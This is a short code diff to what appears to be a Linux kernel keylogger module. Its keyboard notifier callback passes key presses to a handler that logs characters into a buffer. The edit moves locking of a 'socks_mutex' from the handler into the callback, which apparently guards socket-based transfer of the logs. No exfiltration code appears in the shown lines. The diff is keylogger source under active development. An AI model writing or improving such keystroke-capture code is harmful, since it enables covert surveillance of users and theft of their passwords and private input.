@@ -29,8 +29,6 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
     static int32_t buffer_count = 0; // Counts how many chars have been logged.
     struct keyboard_notifier_param *param = dev_id;
 
-    mutex_lock(&socks_mutex);
-
     if (param && param->value) {
         uint32_t keycode = param->value;
         char key = (char) keycode; // Convert keycode to char
@@ -46,8 +44,6 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
         }
     }
 
-    mutex_unlock(&socks_mutex);
-
     return IRQ_NONE;
 }
 
@@ -55,10 +51,14 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
 int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
 
+    mutex_lock(&socks_mutex);
+
     if (code == KBD_KEYSYM && param && param->down) {
         // Call the keyboard interrupt handler
         keyboard_interrupt_handler(0, param);
     }
+
+    mutex_unlock(&socks_mutex);
 
     return NOTIFY_OK;
 }
